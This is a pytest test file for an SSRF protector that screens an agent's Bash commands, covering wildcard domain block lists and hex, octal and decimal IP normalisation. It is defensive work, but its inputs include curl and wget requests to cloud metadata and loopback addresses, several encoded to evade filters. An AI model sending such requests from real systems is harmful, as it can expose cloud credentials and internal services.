class TestWildcardDomainPatterns:
    """Test wildcard domain pattern matching for SSRF protection."""

    def test_wildcard_suffix_pattern(self):
        """Test *.internal.com pattern blocks all .internal.com domains."""
        protector = SSRFProtector({"additional_blocked_domains": ["*.internal.com"]})

        # Should block any subdomain of .internal.com
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.internal.com"}
        )
        assert should_block
        assert "api.internal.com" in msg

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://db.internal.com"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://cache.internal.com"}
        )
        assert should_block

        # Should NOT block different domains
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://example.com"}
        )
        assert not should_block

    def test_wildcard_prefix_pattern(self):
        """Test admin.* pattern blocks all admin.* domains."""
        protector = SSRFProtector({"additional_blocked_domains": ["admin.*"]})

        # Should block admin with any suffix
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://admin.example.com"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://admin.corp.internal"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://admin.local"}
        )
        assert should_block

        # Should NOT block different subdomains
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.example.com"}
        )
        assert not should_block

    def test_wildcard_middle_pattern(self):
        """Test *.corp.* pattern blocks all .corp. domains."""
        protector = SSRFProtector({"additional_blocked_domains": ["*.corp.*"]})

        # Should block any domain with .corp. in the middle
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.corp.internal"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://db.corp.example.com"}
        )
        assert should_block

        # Should NOT block domains without .corp.
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.example.com"}
        )
        assert not should_block

    def test_single_character_wildcard(self):
        """Test ? wildcard matches exactly one character."""
        protector = SSRFProtector({"additional_blocked_domains": ["test?.example.com"]})

        # Should block test1, test2, testa, etc.
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://test1.example.com"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://testa.example.com"}
        )
        assert should_block

        # Should NOT block test10 (two characters) or test.example.com
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://test10.example.com"}
        )
        assert not should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://test.example.com"}
        )
        assert not should_block

    def test_multiple_wildcard_patterns(self):
        """Test multiple wildcard patterns can coexist."""
        protector = SSRFProtector(
            {"additional_blocked_domains": ["*.internal.com", "admin.*", "metadata.*"]}
        )

        # Should block all patterns
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.internal.com"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://admin.example.com"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://metadata.aws.com"}
        )
        assert should_block

        # Should NOT block unmatched domains
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.example.com"}
        )
        assert not should_block

    def test_wildcard_with_exact_domains(self):
        """Test wildcard patterns work alongside exact domain matches."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": [
                    "exact.example.com",  # Exact match
                    "*.internal.com",  # Wildcard pattern
                ]
            }
        )

        # Should block exact match
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://exact.example.com"}
        )
        assert should_block

        # Should block subdomain of exact match (default subdomain matching)
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://sub.exact.example.com"}
        )
        assert should_block

        # Should block wildcard pattern
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.internal.com"}
        )
        assert should_block

        # Should NOT block unmatched
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://other.example.com"}
        )
        assert not should_block

    def test_case_insensitive_wildcard_matching(self):
        """Test wildcard patterns are case-insensitive."""
        protector = SSRFProtector({"additional_blocked_domains": ["*.Internal.COM"]})

        # Should block regardless of case
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://API.internal.com"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.INTERNAL.com"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.Internal.Com"}
        )
        assert should_block

    def test_invalid_wildcard_patterns_rejected(self):
        """Test that invalid wildcard patterns are rejected with warnings."""
        # This should not crash, invalid patterns should be skipped
        protector = SSRFProtector(
            {
                "additional_blocked_domains": [
                    "***",  # Invalid: too many wildcards
                    "",  # Invalid: empty
                    "*.valid.com",  # Valid: should work
                ]
            }
        )

        # Valid pattern should still work
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://test.valid.com"}
        )
        assert should_block

        # Invalid patterns should be ignored (not crash)
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://example.com"}
        )
        assert not should_block

    def test_wildcard_with_allow_list(self):
        """Test wildcard patterns respect allow-list overrides."""
        protector = SSRFProtector(
            {
                "additional_blocked_domains": ["*.corp.internal"],
                "allowed_domains": ["dev.corp.internal"],
            }
        )

        # Should block by wildcard
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.corp.internal"}
        )
        assert should_block

        # Should allow by allow-list (overrides wildcard)
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://dev.corp.internal"}
        )
        assert not should_block

    def test_metadata_wildcard_pattern(self):
        """Test blocking all metadata endpoints with wildcard."""
        protector = SSRFProtector({"additional_blocked_domains": ["metadata.*"]})

        # Should block all metadata.* domains
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://metadata.google.internal"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://metadata.aws.com"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://metadata.azure.com"}
        )
        assert should_block

        # Should NOT block non-metadata domains
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://api.google.com"}
        )
        assert not should_block

    def test_wildcard_all_subdomains_of_tld(self):
        """Test *.local blocks all .local domains."""
        protector = SSRFProtector({"additional_blocked_domains": ["*.local"]})

        # Should block all .local domains
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://anything.local"}
        )
        assert should_block

        should_block, msg = protector.check(
            "Bash", {"command": "curl http://test.local"}
        )
        assert should_block

        # Should NOT block .localhost or other TLDs
        should_block, msg = protector.check(
            "Bash", {"command": "curl http://example.com"}
        )
        assert not should_block


class TestIPEncodingBypass:
    """Tests for hex/octal/decimal IP encoding bypass protection (#1778)."""

    def setup_method(self):
        self.protector = SSRFProtector({})

    # --- _normalize_ip unit tests ---

    def test_normalize_full_hex_loopback(self):
        assert SSRFProtector._normalize_ip("0x7f000001") == "127.0.0.1"

    def test_normalize_full_hex_metadata(self):
        assert SSRFProtector._normalize_ip("0xa9fea9fe") == "169.254.169.254"

    def test_normalize_full_hex_uppercase(self):
        assert SSRFProtector._normalize_ip("0X7F000001") == "127.0.0.1"

    def test_normalize_full_decimal_loopback(self):
        assert SSRFProtector._normalize_ip("2130706433") == "127.0.0.1"

    def test_normalize_full_decimal_metadata(self):
        assert SSRFProtector._normalize_ip("2852039166") == "169.254.169.254"

    def test_normalize_octal_octets(self):
        assert SSRFProtector._normalize_ip("0177.0.0.01") == "127.0.0.1"

    def test_normalize_hex_octets(self):
        assert SSRFProtector._normalize_ip("0x7f.0x00.0x00.0x01") == "127.0.0.1"

    def test_normalize_mixed_octets(self):
        assert SSRFProtector._normalize_ip("0x7f.0.0.1") == "127.0.0.1"

    def test_normalize_standard_ip_unchanged(self):
        assert SSRFProtector._normalize_ip("127.0.0.1") == "127.0.0.1"

    def test_normalize_domain_unchanged(self):
        assert SSRFProtector._normalize_ip("example.com") == "example.com"

    def test_normalize_empty_string(self):
        assert SSRFProtector._normalize_ip("") == ""

    def test_normalize_overflow_hex_ignored(self):
        assert SSRFProtector._normalize_ip("0xFFFFFFFFFF") == "0xFFFFFFFFFF"

    def test_normalize_overflow_decimal_ignored(self):
        assert SSRFProtector._normalize_ip("4294967296") == "4294967296"

    def test_normalize_octet_overflow_ignored(self):
        assert (
            SSRFProtector._normalize_ip("0x7f.0x00.0x00.0x100")
            == "0x7f.0x00.0x00.0x100"
        )

    # --- Integration: encoded IPs blocked in commands ---

    def test_block_hex_loopback_url(self):
        should_block, msg = self.protector.check(
            "Bash", {"command": "curl http://0x7f000001/admin"}
        )
        assert should_block

    def test_block_decimal_loopback_url(self):
        should_block, msg = self.protector.check(
            "Bash", {"command": "curl http://2130706433/"}
        )
        assert should_block

    def test_block_hex_metadata_url(self):
        should_block, msg = self.protector.check(
            "Bash", {"command": "wget http://0xa9fea9fe/latest/meta-data/"}
        )
        assert should_block

    def test_block_octal_loopback_url(self):
        should_block, msg = self.protector.check(
            "Bash", {"command": "curl http://0177.0.0.01/"}
        )
        assert should_block

    def test_block_hex_octets_url(self):
        should_block, msg = self.protector.check(
            "Bash", {"command": "curl http://0x7f.0x00.0x00.0x01/secret"}
        )
        assert should_block

    def test_block_decimal_private_10_net(self):
        # 167772160 = 10.0.0.0
        should_block, msg = self.protector.check(
            "Bash", {"command": "curl http://167772160/internal"}
        )
        assert should_block

    def test_block_hex_private_192_168(self):
        # 0xc0a80001 = 192.168.0.1
        should_block, msg = self.protector.check(
            "Bash", {"command": "curl http://0xc0a80001/"}
        )
        assert should_block

    # --- 1-part octal, 2-part, and 3-part notation ---

    def test_normalize_one_part_octal_loopback(self):
        assert SSRFProtector._normalize_ip("017700000001") == "127.0.0.1"

    def test_normalize_two_part_metadata(self):
        # 169.16689662 = 169.(254*65536 + 169*256 + 254) = 169.254.169.254
        assert SSRFProtector._normalize_ip("169.16689662") == "169.254.169.254"

    def test_normalize_three_part(self):
        # 10.1.512 = 10.1.(2*256 + 0) = 10.1.2.0
        assert SSRFProtector._normalize_ip("10.1.512") == "10.1.2.0"

    def test_block_one_part_octal_loopback_url(self):
        should_block, msg = self.protector.check(
            "Bash", {"command": "curl http://017700000001/admin"}
        )
        assert should_block

    def test_block_two_part_metadata_url(self):
        should_block, msg = self.protector.check(
            "Bash", {"command": "curl http://169.16689662/latest/meta-data/"}
        )
        assert should_block

    def test_normalize_octal_with_invalid_digit_falls_back_to_decimal(self):
        # 0169 has digit 9 invalid in octal — should fall back to decimal 169
        assert SSRFProtector._normalize_ip("0169.254.169.254") == "169.254.169.254"

    # --- Safe scenarios: no false positives ---

    def test_safe_public_domain(self):
        should_block, _ = self.protector.check(
            "Bash", {"command": "curl http://example.com/api"}
        )
        assert not should_block

    def test_safe_hex_in_echo(self):
        """Hex constant in non-URL context should not trigger."""
        should_block, _ = self.protector.check("Bash", {"command": 'echo "0x7f000001"'})
        assert not should_block

    def test_safe_hex_in_code_comment(self):
        """Hex literal in code should not trigger."""
        should_block, _ = self.protector.check(
            "Bash", {"command": "grep '0x7f000001' source.c"}
        )
        assert not should_block


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
